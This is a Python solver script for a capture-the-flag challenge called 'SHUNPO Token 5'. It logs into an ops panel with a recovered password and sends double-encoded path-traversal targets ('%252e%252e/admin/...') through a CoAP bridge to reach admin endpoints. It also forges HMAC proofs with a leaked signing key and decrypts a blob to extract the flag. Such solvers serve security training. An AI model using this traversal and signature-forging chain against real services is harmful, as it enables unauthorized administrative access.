#!/usr/bin/env python3
"""
SHUNPO Token 5 solver (latest)

Requires:
  - TOKEN1: ops-panel password
  - TOKEN2: route key
  - TOKEN3: internal signing key
  - TOKEN4: bridge ticket

Flow:
  1. Log into the ops panel as opsadmin / TOKEN1
  2. Optionally switch detail mode to extended
  3. Submit bootstrap through the constrained CoAP bridge
  4. Recover nonce
  5. Submit material through the constrained CoAP bridge
  6. Decode blob to recover confirm
  7. Submit finalize through the constrained CoAP bridge
  8. Extract and print Token 5
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import html
import json
import re
import sys
import time

import requests


def hmac_hex(key: str, message: str) -> str:
    return hmac.new(key.encode("utf-8"), message.encode("utf-8"), hashlib.sha256).hexdigest()


def extract_csrf(page: str) -> str:
    patterns = [
        r'name="csrf"\s+value="([^"]+)"',
        r"name='csrf'\s+value='([^']+)'",
        r'value="([^"]+)"\s+name="csrf"',
    ]
    for pat in patterns:
        m = re.search(pat, page)
        if m:
            return html.unescape(m.group(1))
    raise RuntimeError("Could not extract csrf token")


def extract_json_objects(text: str) -> list[dict]:
    objs: list[dict] = []
    for m in re.finditer(r"\{.*?\}", text, flags=re.DOTALL):
        candidate = html.unescape(m.group(0))
        try:
            objs.append(json.loads(candidate))
        except Exception:
            continue
    return objs


def extract_first_json(text: str, required_keys: set[str] | None = None) -> dict:
    required_keys = required_keys or set()
    for obj in extract_json_objects(text):
        if required_keys.issubset(obj.keys()):
            return obj
    raise RuntimeError(f"Could not find JSON object with keys: {sorted(required_keys)}")


def extract_token5(text: str) -> str:
    for obj in extract_json_objects(text):
        for key in ("token", "final_token"):
            value = obj.get(key)
            if isinstance(value, str) and value.startswith("PCCC{SHN-A5-"):
                return value

    m = re.search(r"PCCC\{SHN-A5-[^}]+\}", text)
    if m:
        return m.group(0)

    raise RuntimeError("Could not extract Token 5")


def login(session: requests.Session, base_url: str, username: str, password: str) -> str:
    r = session.get(f"{base_url}/login", timeout=10)
    r.raise_for_status()

    r = session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        timeout=10,
        allow_redirects=True,
    )
    r.raise_for_status()

    if "/dashboard" not in r.url and "Sign out" not in r.text and "Ops Panel" not in r.text:
        raise RuntimeError("Login appears to have failed")

    return extract_csrf(r.text)


def set_detail_mode(session: requests.Session, base_url: str, csrf: str, mode: str = "extended") -> str:
    r = session.post(
        f"{base_url}/settings/detail-mode",
        data={"csrf": csrf, "mode": mode, "next": "/diagnostics/coap"},
        timeout=10,
        allow_redirects=True,
    )
    r.raise_for_status()
    return extract_csrf(r.text)


def bridge_submit(
    session: requests.Session,
    base_url: str,
    bridge_path: str,
    csrf: str,
    ticket: str,
    route_key: str,
    target: str,
    signing_key: str,
) -> str:
    sig = hmac_hex(signing_key, f"{ticket}|{route_key}|{target}")
    r = session.post(
        f"{base_url}{bridge_path}",
        data={
            "csrf": csrf,
            "ticket": ticket,
            "route_key": route_key,
            "target": target,
            "sig": sig,
        },
        timeout=15,
        allow_redirects=True,
    )
    r.raise_for_status()
    return r.text


def decode_material_blob(ticket: str, route_key: str, nonce: str, blob: str) -> dict:
    padding = "=" * ((4 - len(blob) % 4) % 4)
    ciphertext = base64.urlsafe_b64decode(blob + padding)
    key = hashlib.sha256(f"{ticket}|{route_key}|{nonce}".encode("utf-8")).digest()
    stream = bytes(key[i % len(key)] for i in range(len(ciphertext)))
    plaintext = bytes(c ^ s for c, s in zip(ciphertext, stream))
    return json.loads(plaintext.decode("utf-8"))


def build_bootstrap_target(token2: str, token4: str, ts: str) -> str:
    return (
        "coap://sp-coap.ninja/telemetry/%252e%252e/admin/bootstrap"
        f"?ticket={token4}&rk={token2}&ts={ts}"
    )


def build_material_target(token2: str, token3: str, token4: str, nonce: str, ts: str) -> str:
    proof_msg = f"material:{token4}:{token2}:{nonce}:{ts}"
    proof = hmac_hex(token3, proof_msg)
    return (
        "coap://sp-coap.ninja/telemetry/%252e%252e/admin/material"
        f"?ticket={token4}&rk={token2}&nonce={nonce}&ts={ts}&proof={proof}"
    )


def build_finalize_target(token2: str, token3: str, token4: str, nonce: str, confirm: str, ts: str) -> str:
    proof_msg = f"final:{token4}:{token2}:{nonce}:{confirm}:{ts}"
    proof = hmac_hex(token3, proof_msg)
    return (
        "coap://sp-coap.ninja/telemetry/%252e%252e/admin/finalize"
        f"?ticket={token4}&rk={token2}&nonce={nonce}&confirm={confirm}&ts={ts}&proof={proof}"
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve SHUNPO Token 5")
    parser.add_argument("--ops-base", default="http://sp-ops.ninja:8080", help="Ops panel base URL")
    parser.add_argument("--bridge-path", default="/diagnostics/coap", help="CoAP bridge page path")
    parser.add_argument("--username", default="opsadmin", help="Ops panel username")
    parser.add_argument("--token1", required=True, help="Token 1 / ops-panel password")
    parser.add_argument("--token2", required=True, help="Token 2 / route key")
    parser.add_argument("--token3", required=True, help="Token 3 / signing key")
    parser.add_argument("--token4", required=True, help="Token 4 / bridge ticket")
    parser.add_argument("--no-extended", action="store_true", help="Do not switch detail mode to extended")
    parser.add_argument("--debug-html", action="store_true", help="Print raw HTML responses before parsing")
    args = parser.parse_args()

    session = requests.Session()
    session.headers.update({"User-Agent": "shunpo-token5-solver/1.0"})

    try:
        csrf = login(session, args.ops_base, args.username, args.token1)
        print("[+] Logged into ops panel")

        if not args.no_extended:
            csrf = set_detail_mode(session, args.ops_base, csrf, "extended")
            print("[+] Detail mode set to extended")

        # Bootstrap
        ts_boot = str(int(time.time()))
        bootstrap_target = build_bootstrap_target(args.token2, args.token4, ts_boot)
        print(f"[+] Bootstrap target: {bootstrap_target}")

        bootstrap_html = bridge_submit(
            session=session,
            base_url=args.ops_base,
            bridge_path=args.bridge_path,
            csrf=csrf,
            ticket=args.token4,
            route_key=args.token2,
            target=bootstrap_target,
            signing_key=args.token3,
        )
        if args.debug_html:
            print("\n[DEBUG] Bootstrap response:\n")
            print(bootstrap_html)

        bootstrap_obj = extract_first_json(bootstrap_html, {"nonce"})
        nonce = bootstrap_obj["nonce"]
        print(f"[+] Nonce: {nonce}")

        # Material
        ts_mat = str(int(time.time()))
        material_target = build_material_target(args.token2, args.token3, args.token4, nonce, ts_mat)
        print(f"[+] Material target: {material_target}")

        material_html = bridge_submit(
            session=session,
            base_url=args.ops_base,
            bridge_path=args.bridge_path,
            csrf=csrf,
            ticket=args.token4,
            route_key=args.token2,
            target=material_target,
            signing_key=args.token3,
        )
        if args.debug_html:
            print("\n[DEBUG] Material response:\n")
            print(material_html)

        material_obj = extract_first_json(material_html, {"blob"})
        blob = material_obj["blob"]
        encoding = material_obj.get("encoding", "")
        print(f"[+] Material encoding: {encoding or '<not shown>'}")

        decoded = decode_material_blob(args.token4, args.token2, nonce, blob)
        confirm = decoded["confirm"]
        print(f"[+] Confirm: {confirm}")

        # Finalize
        ts_fin = str(int(time.time()))
        finalize_target = build_finalize_target(args.token2, args.token3, args.token4, nonce, confirm, ts_fin)
        print(f"[+] Finalize target: {finalize_target}")

        finalize_html = bridge_submit(
            session=session,
            base_url=args.ops_base,
            bridge_path=args.bridge_path,
            csrf=csrf,
            ticket=args.token4,
            route_key=args.token2,
            target=finalize_target,
            signing_key=args.token3,
        )
        if args.debug_html:
            print("\n[DEBUG] Finalize response:\n")
            print(finalize_html)

        token5 = extract_token5(finalize_html)
        print(f"[+] Token 5: {token5}")
        return 0

    except requests.RequestException as exc:
        print(f"[-] HTTP error: {exc}", file=sys.stderr)
        return 1
    except Exception as exc:
        print(f"[-] Solver failed: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())